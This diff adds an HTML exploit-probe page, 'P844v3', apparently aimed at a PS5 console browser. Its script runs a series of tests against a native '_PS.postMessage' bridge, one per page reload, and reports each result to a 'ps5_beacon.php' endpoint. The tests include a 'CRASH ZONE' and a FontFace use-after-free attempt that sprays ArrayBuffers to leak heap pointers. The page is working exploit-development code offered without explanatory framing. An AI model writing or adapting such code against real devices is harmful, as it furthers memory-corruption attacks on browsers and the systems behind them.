@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v3</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v3_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);localStorage.removeItem('p844v2_test');localStorage.removeItem('p844_test');}catch(e){}}
+
+var testNum=getTest();
+log('P844v3 BOOT test='+testNum);
+bn('P844v3-BOOT','test='+testNum);
+
+var TESTS=[
+  // T0: wrong this binding
+  function T0(){
+    var pm=_PS.postMessage;
+    var r1,r2,r3;
+    try{r1=pm.call(null,'null-this');}catch(e){r1='err:'+e.message;}
+    try{r2=pm.call({},'obj-this');}catch(e){r2='err:'+e.message;}
+    try{r3=pm.call(window,'win-this');}catch(e){r3='err:'+e.message;}
+    return 'null='+r1+'|obj='+r2+'|win='+r3;
+  },
+  // T1: getOwnPropertyNames deep
+  function T1(){
+    var r=[];
+    try{r.push('own:'+Object.getOwnPropertyNames(_PS).join(','));}catch(e){r.push('ownErr:'+e.message);}
+    try{r.push('keys:'+Object.keys(_PS).join(','));}catch(e){r.push('keysErr:'+e.message);}
+    try{
+      var syms=Object.getOwnPropertySymbols(_PS);
+      r.push('syms:'+syms.length);
+      for(var i=0;i<syms.length;i++)r.push('sym:'+String(syms[i]));
+    }catch(e){r.push('symErr:'+e.message);}
+    var d=Object.getOwnPropertyDescriptor(_PS,'postMessage');
+    if(d){r.push('v='+typeof d.value+'|w='+d.writable+'|e='+d.enumerable+'|c='+d.configurable);
+      if(d.get)r.push('getter='+typeof d.get);
+      if(d.set)r.push('setter='+typeof d.set);
+    }
+    return r.join('|');
+  },
+  // T2: Reflect ops
+  function T2(){
+    var r=[];
+    try{r.push('isExt='+Reflect.isExtensible(_PS));}catch(e){r.push('isExtErr:'+e.message);}
+    try{r.push('prevExt='+Reflect.preventExtensions(_PS));}catch(e){r.push('prevExtErr:'+e.message);}
+    try{r.push('isExt2='+Reflect.isExtensible(_PS));}catch(e){r.push('isExt2Err:'+e.message);}
+    try{r.push('has_pm='+Reflect.has(_PS,'postMessage'));}catch(e){r.push('hasErr:'+e.message);}
+    try{r.push('proto='+String(Reflect.getPrototypeOf(_PS)));}catch(e){r.push('protoErr:'+e.message);}
+    try{Object.freeze(_PS);r.push('frozen='+Object.isFrozen(_PS));}catch(e){r.push('freezeErr:'+e.message);}
+    return r.join('|');
+  },
+  // T3: FontFace UAF DURING toString (CRITICAL)
+  function T3(){
+    var H='none';
+    var fabs=[];
+    var obj={toString:function(){
+      try{
+        var st=document.createElement('style');
+        st.textContent="@font-face{font-family:uu3;src:local(Arial);unicode-range:U+0042;}";
+        document.head.appendChild(st);
+        var face=new FontFace('uf3',"local('Helvetica')",{unicodeRange:'U+0041'});
+        document.fonts.add(face);
+        void face.loaded;
+        var ffired=false;
+        Object.defineProperty(FontFace.prototype,'then',{
+          configurable:true,
+          get:function(){
+            if(ffired)return undefined;
+            ffired=true;
+            st.remove();st.textContent='';st=null;
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            fabs=[];
+            for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+            try{document.fonts.check('1em uu3');}catch(e){}
+            document.body.offsetHeight;
+            return undefined;
+          },set:function(){}
+        });
+        document.fonts.load('1em uf3, uu3','AB');
+        for(var i=0;i<fabs.length;i++){
+          var bv=new BigUint64Array(fabs[i]);
+          for(var j=0;j<24;j++){
+            if(bv[j]!==0n){
+              var hi=Number(bv[j]>>32n);
+              if(hi>0x100&&hi<0x7FFF){H='0x'+bv[j].toString(16);break;}
+            }
+          }
+          if(H!=='none')break;
+        }
+      }catch(e){H='err:'+e.message;}
+      return 'uaf-H='+H;
+    }};
+    var r=_PS.postMessage(obj);
+    return 'H='+H+'|ret='+r+'|bufs='+fabs.length;
+  },
+  // T4: postMessageNative vs _PS.postMessage
+  function T4(){
+    var r=[];
+    try{r.push('pmn='+typeof postMessageNative);}catch(e){r.push('pmn=undef');}
+    try{
+      var r1=postMessageNative('test-native');
+      r.push('native_ret='+r1);
+    }catch(e){r.push('native_err='+e.message);}
+    try{r.push('same='+(postMessageNative===_PS.postMessage));}catch(e){r.push('sameErr='+e.message);}
+    try{
+      var orig=postMessageNative;
+      postMessageNative=function(d){return 'intercepted:'+d;};
+      var r2=postMessageNative('test-replace');
+      r.push('replaced='+r2);
+      var r3=_PS.postMessage('after-replace');
+      r.push('ps_after='+r3);
+      postMessageNative=orig;
+    }catch(e){r.push('replaceErr='+e.message);}
+    return r.join('|');
+  },
+  // T5: bind/apply/call
+  function T5(){
+    var r=[];
+    var pm=_PS.postMessage;
+    try{var bound=pm.bind(_PS);r.push('bind='+typeof bound);r.push('bind_ret='+bound('bind-test'));}catch(e){r.push('bindErr='+e.message);}
+    try{r.push('apply_ret='+pm.apply(_PS,['apply-test']));}catch(e){r.push('applyErr='+e.message);}
+    try{r.push('fpcall_ret='+Function.prototype.call.call(pm,_PS,'fpcall-test'));}catch(e){r.push('fpcallErr='+e.message);}
+    return r.join('|');
+  },
+  // T6: type variants
+  function T6(){
+    var r=[];
+    try{r.push('num='+_PS.postMessage(42));}catch(e){r.push('numErr='+e.message);}
+    try{r.push('bool='+_PS.postMessage(true));}catch(e){r.push('boolErr='+e.message);}
+    try{r.push('arr='+_PS.postMessage([1,2,3]));}catch(e){r.push('arrErr='+e.message);}
+    try{r.push('nested='+_PS.postMessage({a:{b:'deep'}}));}catch(e){r.push('nestedErr='+e.message);}
+    try{r.push('null='+_PS.postMessage(null));}catch(e){r.push('nullErr='+e.message);}
+    try{r.push('undef='+_PS.postMessage(undefined));}catch(e){r.push('undefErr='+e.message);}
+    try{r.push('nan='+_PS.postMessage(NaN));}catch(e){r.push('nanErr='+e.message);}
+    try{r.push('inf='+_PS.postMessage(Infinity));}catch(e){r.push('infErr='+e.message);}
+    return r.join('|');
+  },
+  // T7: toString returns non-string (number, object, null)
+  function T7(){
+    var r=[];
+    var obj1={toString:function(){return 42;}};
+    try{r.push('num='+_PS.postMessage(obj1));}catch(e){r.push('numErr='+e.message);}
+    var obj2={toString:function(){return null;}};
+    try{r.push('null='+_PS.postMessage(obj2));}catch(e){r.push('nullErr='+e.message);}
+    var obj3={toString:function(){return {nested:'obj'};}};
+    try{r.push('obj='+_PS.postMessage(obj3));}catch(e){r.push('objErr='+e.message);}
+    var obj4={toString:function(){return undefined;}};
+    try{r.push('undef='+_PS.postMessage(obj4));}catch(e){r.push('undefErr='+e.message);}
+    return r.join('|');
+  },
+  // T8: toString throws (error propagation test)
+  function T8(){
+    var r=[];
+    var obj={toString:function(){throw new Error('boom');}};
+    try{_PS.postMessage(obj);r.push('noThrow');}catch(e){r.push('threw='+e.message);}
+    var obj2={toString:function(){throw 42;}};
+    try{_PS.postMessage(obj2);r.push('noThrow2');}catch(e){r.push('threw2='+e);}
+    return r.join('|');
+  },
+  // T9: medium string (10KB — find crash threshold)
+  function T9(){
+    var s10k='A'.repeat(10240);
+    var r;
+    try{r=_PS.postMessage(s10k);}catch(e){r='err:'+e.message;}
+    return '10KB='+r;
+  },
+  // T10: medium string (100KB)
+  function T10(){
+    var s100k='A'.repeat(102400);
+    var r;
+    try{r=_PS.postMessage(s100k);}catch(e){r='err:'+e.message;}
+    return '100KB='+r;
+  },
+  // T11: medium string (1MB)
+  function T11(){
+    var s1m='A'.repeat(1048576);
+    var r;
+    try{r=_PS.postMessage(s1m);}catch(e){r='err:'+e.message;}
+    return '1MB='+r;
+  },
+
+  // === CRASH ZONE (T12+) ===
+  // T12: Proxy — just create (no property access)
+  function T12(){
+    var p=new Proxy(_PS,{});
+    return 'created='+typeof p;
+  },
+  // T13: Proxy — read postMessage prop via trap
+  function T13(){
+    var got=[];
+    var p=new Proxy(_PS,{get:function(t,prop){got.push(prop);return Reflect.get(t,prop);}});
+    var pm=p.postMessage;
+    return 'got='+got.join(',')+'|pm='+typeof pm;
+  },
+  // T14: Proxy — call postMessage through proxy
+  function T14(){
+    var got=[];
+    var p=new Proxy(_PS,{get:function(t,prop){got.push('get:'+prop);return Reflect.get(t,prop);}});
+    try{p.postMessage('proxy-call');}catch(e){got.push('err:'+e.message);}
+    return got.join('|');
+  },
+  // T15: Proxy on postMessage function itself
+  function T15(){
+    var got=[];
+    var origPM=_PS.postMessage;
+    var pFn=new Proxy(origPM,{apply:function(t,th,a){got.push('apply:'+a[0]);return Reflect.apply(t,th,a);}});
+    try{pFn.call(_PS,'proxy-fn');}catch(e){got.push('err:'+e.message);}
+    return got.join('|');
+  },
+  // T16: Symbol with toString override
+  function T16(){
+    var origTS=Symbol.prototype.toString;
+    var called=false;
+    Symbol.prototype.toString=function(){called=true;return 'safe';};
+    var r;
+    try{r=_PS.postMessage(Symbol('test'));}catch(e){r='err:'+e.message;}
+    Symbol.prototype.toString=origTS;
+    return 'called='+called+'|ret='+r;
+  },
+  // T17: Raw Symbol crash
+  function T17(){
+    var r;
+    try{r=_PS.postMessage(Symbol('crash'));}catch(e){r='err:'+e.message;}
+    return 'ret='+r;
+  }
+];
+
+var NAMES=[
+  'T0-wrongThis','T1-getOwnPropNames','T2-reflectOps',
+  'T3-toStringUAF','T4-postMessageNative','T5-bindApplyCall',
+  'T6-typeVariants','T7-toStringNonString','T8-toStringThrows',
+  'T9-str10KB','T10-str100KB','T11-str1MB',
+  'T12-proxyCreate','T13-proxyGet','T14-proxyCall','T15-proxyFn',
+  'T16-symOverride','T17-symRaw'
+];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL TESTS COMPLETE');
+    bn('P844v3-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v3-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v3-'+name+'-OK',result);
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v3-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,100);
+</script>
+</body>
+</html>
